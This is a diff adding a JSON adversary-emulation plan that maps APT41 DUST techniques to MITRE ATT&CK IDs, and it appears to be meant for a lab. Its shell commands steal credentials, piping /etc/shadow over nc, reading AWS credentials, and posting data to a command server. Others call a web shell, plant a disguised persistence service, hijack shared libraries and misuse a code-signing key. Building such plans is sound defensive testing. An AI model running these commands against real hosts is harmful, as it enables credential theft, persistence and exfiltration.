@@ -1,0 +1,362 @@
+[
+  {
+    "ability_id": "e1178d46-9bcf-51d5-83e8-5e04b4880f2a",
+    "name": "T1102 - Web Service",
+    "tactic": "command-and-control",
+    "technique_name": "Web Service",
+    "technique_id": "T1102",
+    "description": "APT41 DUST used compromised Google Workspace accounts for command and control.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "rm -rf /root/.ssh/known_hosts && curl -X POST -H \"Content-Type: application/json\" -d '{\"key\":\"session1\",\"val\":\"stolen_credentials_or_commands\"}' http://172.21.0.20:8080/store && curl http://172.21.0.20:8080/fetch/session1"
+      }
+    ]
+  },
+  {
+    "ability_id": "68d2e694-9c92-5b92-b116-545a6e698230",
+    "name": "T1213.006 - Databases",
+    "tactic": "collection",
+    "technique_name": "Databases",
+    "technique_id": "T1213.006",
+    "description": "APT41 DUST collected data from victim Oracle databases using SQLULDR2.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "mysql -h 172.21.0.20 -u attacker -pAttack3rPass -e \"SELECT * FROM sensitive_data.credentials;\""
+      }
+    ]
+  },
+  {
+    "ability_id": "50aead6e-e31e-5311-9a87-40a98aa3d8fe",
+    "name": "T1543.003 - Windows Service",
+    "tactic": "persistence",
+    "technique_name": "Windows Service",
+    "technique_id": "T1543.003",
+    "description": "APT41 DUST used Windows Services with names such as `Windows Defend` for persistence of DUSTPAN.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": " printf \"[Unit]\nDescription=Windows Defend Service\n[Service]\nExecStart=/srv/samba/share/WindowsDefend.sh\nRestart=always\n[Install]\nWantedBy=multi-user.target\n\" > WindowsDefend.service && smbclient //172.21.0.20/share -U DebianUser%DebianUser -c 'put /bin/bash WindowsDefend.sh' && smbclient //172.21.0.20/share -U DebianUser%DebianUser -c 'put WindowsDefend.service' && sshpass -p 'DebianUser' ssh -o StrictHostKeyChecking=no DebianUser@172.21.0.20 'nohup /srv/samba/share/WindowsDefend.sh &'"
+      }
+    ]
+  },
+  {
+    "ability_id": "45a1b5c8-613f-50fa-a85f-4114d3c320e5",
+    "name": "T1070.004 - File Deletion",
+    "tactic": "defense-evasion",
+    "technique_name": "File Deletion",
+    "technique_id": "T1070.004",
+    "description": "APT41 DUST deleted various artifacts from victim systems following use.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no  attacker@172.21.0.20 'echo maliciousfile > /tmp/malware.txt && rm -f /tmp/malware.txt'"
+      }
+    ]
+  },
+  {
+    "ability_id": "5ddb8518-3a39-51b5-857f-982be5748f45",
+    "name": "T1105 - Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "technique_name": "Ingress Tool Transfer",
+    "technique_id": "T1105",
+    "description": "APT41 DUST involved execution of `certutil.exe` via web shell to download the DUSTPAN dropper.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p 'RootPass123' scp -o StrictHostKeyChecking=no root@172.22.0.20:/tmp/toolfile /tmp/toolfile' &&  sshpass -p 'RootPass123' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@172.21.0.20:/tmp/toolfile /tmp/toolfile"
+      }
+    ]
+  },
+  {
+    "ability_id": "3b0dfc5b-6896-5473-8c79-491414d5ccbd",
+    "name": "T1505.003 - Web Shell",
+    "tactic": "persistence",
+    "technique_name": "Web Shell",
+    "technique_id": "T1505.003",
+    "description": "APT41 DUST involved use of web shells such as ANTSWORD and BLUEBEAM for persistence.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl \"http://172.21.0.20/shell.php?cmd=id\""
+      }
+    ]
+  },
+  {
+    "ability_id": "28d1bbfe-11e9-5dbb-b7a3-531273eb921c",
+    "name": "T1593.002 - Search Engines",
+    "tactic": "reconnaissance",
+    "technique_name": "Search Engines",
+    "technique_id": "T1593.002",
+    "description": "APT41 DUST involved use of search engines to research victim servers.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl http://172.21.0.20/server-status.php"
+      }
+    ]
+  },
+  {
+    "ability_id": "d28a43be-6c11-5cd5-928e-6b6f51c82e19",
+    "name": "T1588.003 - Code Signing Certificates",
+    "tactic": "resource-development",
+    "technique_name": "Code Signing Certificates",
+    "technique_id": "T1588.003",
+    "description": "APT41 DUST used stolen code signing certificates to sign DUSTTRAP malware and components.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "wget http://172.21.0.20/root/certs/code_signing.pfx -O code_signing.pfx && openssl pkcs12 -in code_signing.pfx -nocerts -nodes -passin pass:password123 -out code_signing.key && openssl pkcs12 -in code_signing.pfx -clcerts -nokeys -passin pass:password123 -out code_signing.crt && echo 'console.log(\"Malicious signed code executed\");' > malicious.js && openssl dgst -sha256 -sign code_signing.key -out malicious.js.sig malicious.js && cat malicious.js"
+      }
+    ]
+  },
+  {
+    "ability_id": "50547ac3-366a-520f-ace0-137326121072",
+    "name": "T1586.003 - Cloud Accounts",
+    "tactic": "resource-development",
+    "technique_name": "Cloud Accounts",
+    "technique_id": "T1586.003",
+    "description": "APT41 DUST used compromised Google Workspace accounts for command and control.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 \"cat ~/.aws/credentials\" && echo \"aws s3 ls not available on lab!\""
+      }
+    ]
+  },
+  {
+    "ability_id": "e45e550c-6eb4-5885-832e-d4d6205af223",
+    "name": "T1119 - Automated Collection",
+    "tactic": "collection",
+    "technique_name": "Automated Collection",
+    "technique_id": "T1119",
+    "description": "APT41 DUST used tools such as SQLULDR2 and PINEGROVE to gather local system and database information.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl http://172.21.0.20/tmp/collected/ -s --fail --retry 3"
+      }
+    ]
+  },
+  {
+    "ability_id": "5a76b3ab-62e8-5c89-88bc-048754070557",
+    "name": "T1027.013 - Encrypted/Encoded File",
+    "tactic": "defense-evasion",
+    "technique_name": "Encrypted/Encoded File",
+    "technique_id": "T1027.013",
+    "description": "APT41 DUST used encrypted payloads decrypted and executed in memory.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 \"echo HELLO_LAB | python3 /home/attacker/reverse.py\""
+      }
+    ]
+  },
+  {
+    "ability_id": "b1f0ec99-37d0-5780-9ea6-dcf9fc371451",
+    "name": "T1074.001 - Local Data Staging",
+    "tactic": "collection",
+    "technique_name": "Local Data Staging",
+    "technique_id": "T1074.001",
+    "description": "APT41 DUST involved exporting data from Oracle databases to local CSV files prior to exfiltration.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "echo \"cat /etc/passwd | tee -a /tmp/staged_data.csv\" | nc -w 2 172.21.0.20 4444 && echo \"cat /etc/shadow | tee -a /tmp/staged_data.csv\" | nc -w 2 172.21.0.20 4444 && echo \"cat /tmp/staged_data.csv\" | nc -w 2 172.21.0.20 4444 | tee -a /tmp/staged_data.csv"
+      }
+    ]
+  },
+  {
+    "ability_id": "18b2c164-5c90-5a58-bd48-5d83012db14a",
+    "name": "T1567.002 - Exfiltration to Cloud Storage",
+    "tactic": "exfiltration",
+    "technique_name": "Exfiltration to Cloud Storage",
+    "technique_id": "T1567.002",
+    "description": "APT41 DUST exfiltrated collected information to OneDrive.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "echo \"For security reasons no user/password of Cloud Storage will be shown here! This is a console script to upload files...\""
+      }
+    ]
+  },
+  {
+    "ability_id": "523b5e79-dae3-5b5c-87b6-f0303ddce613",
+    "name": "T1036.004 - Masquerade Task or Service",
+    "tactic": "defense-evasion",
+    "technique_name": "Masquerade Task or Service",
+    "technique_id": "T1036.004",
+    "description": "APT41 DUST disguised DUSTPAN as a legitimate Windows binary such as `w3wp.exe` or `conn.exe`.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'BackupPass123' ssh -o StrictHostKeyChecking=no backupsvc@172.21.0.20 \"nohup /usr/local/bin/systemd-update </dev/null >/dev/null 2>&1 &\""
+      }
+    ]
+  },
+  {
+    "ability_id": "26969d1e-26c3-5b38-82e9-47bebd388a41",
+    "name": "T1596.005 - Scan Databases",
+    "tactic": "reconnaissance",
+    "technique_name": "Scan Databases",
+    "technique_id": "T1596.005",
+    "description": "APT41 DUST used internet scan data for target development.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "whatweb -a 3 172.21.0.20"
+      }
+    ]
+  },
+  {
+    "ability_id": "d6f50b61-3fac-587d-8418-82f297b5ac89",
+    "name": "T1574.001 - DLL",
+    "tactic": "persistence",
+    "technique_name": "DLL",
+    "technique_id": "T1574.001",
+    "description": "APT41 DUST involved the use of DLL search order hijacking to execute DUSTTRAP. APT41 DUST used also DLL side-loading to execute DUSTTRAP via an AhnLab uninstaller.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'mkdir -p /home/attacker/malicious /home/attacker/vulnerable_app && cd /home/attacker/malicious && printf \"#include <stdlib.h>\\nvoid hello(){ system(\\\"id > /tmp/hijack_result.txt\\\"); }\\n\" > hijack.c && gcc -shared -fPIC -o liblegit.so hijack.c && mv liblegit.so /home/attacker/vulnerable_app/liblegit.so && printf \"#include <stdio.h>\\nvoid hello();\\nint main(){ hello(); return 0; }\\n\" > /home/attacker/vulnerable_app/vulnapp.c && gcc /home/attacker/vulnerable_app/vulnapp.c -L/home/attacker/vulnerable_app -llegit -o /home/attacker/vulnerable_app/vulnapp && LD_LIBRARY_PATH=/home/attacker/vulnerable_app /home/attacker/vulnerable_app/vulnapp && cat /tmp/hijack_result.txt'"
+      }
+    ]
+  },
+  {
+    "ability_id": "a2aaed57-e037-5782-a54f-f8d30715b890",
+    "name": "T1569.002 - Service Execution",
+    "tactic": "execution",
+    "technique_name": "Service Execution",
+    "technique_id": "T1569.002",
+    "description": "APT41 DUST used Windows services to execute DUSTPAN.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl -X POST -d \"cmd=touch /tmp/owned_by_attack\" http://172.21.0.20:8081/exec"
+      }
+    ]
+  },
+  {
+    "ability_id": "e4e97a8f-0ae8-50ba-8147-a2632a74ca39",
+    "name": "T1560.001 - Archive via Utility",
+    "tactic": "collection",
+    "technique_name": "Archive via Utility",
+    "technique_id": "T1560.001",
+    "description": "APT41 DUST used `rar` to compress data downloaded from internal Oracle databases prior to exfiltration.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'rar a /tmp/collected_data.rar /var/log/*.log' && sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'sshpass -p 'Passw0rd' scp -o StrictHostKeyChecking=no /tmp/collected_data.rar attacker@172.22.0.20:/tmp/'"
+      }
+    ]
+  },
+  {
+    "ability_id": "63704f91-346f-57f3-b64e-bfa2a1e61fed",
+    "name": "T1071.001 - Web Protocols",
+    "tactic": "command-and-control",
+    "technique_name": "Web Protocols",
+    "technique_id": "T1071.001",
+    "description": "APT41 DUST used HTTPS for command and control.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl -k -X POST https://172.21.0.20:443/cmd -H \"Content-Type: application/json\" -d '{\"command\":\"id\"}'"
+      }
+    ]
+  },
+  {
+    "ability_id": "251d6bc3-40a8-5117-8116-3492c6de3a72",
+    "name": "T1594 - Search Victim-Owned Websites",
+    "tactic": "reconnaissance",
+    "technique_name": "Search Victim-Owned Websites",
+    "technique_id": "T1594",
+    "description": "APT41 DUST involved access of external victim websites for target development.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl http://172.21.0.20/robots.txt && curl http://172.21.0.20/secret/index.html"
+      }
+    ]
+  },
+  {
+    "ability_id": "c7960378-b205-548f-b488-36e032ed9162",
+    "name": "T1583.007 - Serverless",
+    "tactic": "resource-development",
+    "technique_name": "Serverless",
+    "technique_id": "T1583.007",
+    "description": "APT41 DUST used infrastructure hosted behind Cloudflare or utilized Cloudflare Workers for command and control.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl -X POST --data 'id' http://172.21.0.20:8082  && curl -X POST --data 'ifconfig' http://172.21.0.20:8082"
+      }
+    ]
+  },
+  {
+    "ability_id": "47aaf622-b794-5cb0-8976-f5f4b062eb31",
+    "name": "T1573.002 - Asymmetric Cryptography",
+    "tactic": "command-and-control",
+    "technique_name": "Asymmetric Cryptography",
+    "technique_id": "T1573.002",
+    "description": "APT41 DUST used HTTPS for command and control.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo \"ls -la\" | openssl pkeyutl -encrypt -pubin -inkey /root/public_key.pem -out /root/encrypted_command.bin && /root/decrypt_and_execute.sh && cat /root/decrypted_command.txt'"
+      }
+    ]
+  },
+  {
+    "ability_id": "8a2ddf73-3964-540d-a67c-7a9fdfc3d704",
+    "name": "T1553.002 - Code Signing",
+    "tactic": "defense-evasion",
+    "technique_name": "Code Signing",
+    "technique_id": "T1553.002",
+    "description": "APT41 DUST used stolen code signing certificates for DUSTTRAP malware and subsequent payloads.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 \"echo 'echo Malicious_signed_payload_executed' | openssl pkeyutl -sign -inkey /root/code_signing_key.pem | socat - TCP:172.21.0.20:4445 && echo Payload_sent\""
+      }
+    ]
+  },
+  {
+    "ability_id": "8a2ddf73-3964-540d-a67c-roth",
+    "name": "END OF EMULATION",
+    "tactic": "impact",
+    "technique_name": "System Shutdown",
+    "technique_id": "T1529",
+    "description": "This is the end.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "echo \"END OF APT 41 DUST\""
+      }
+    ]
+  }
+]
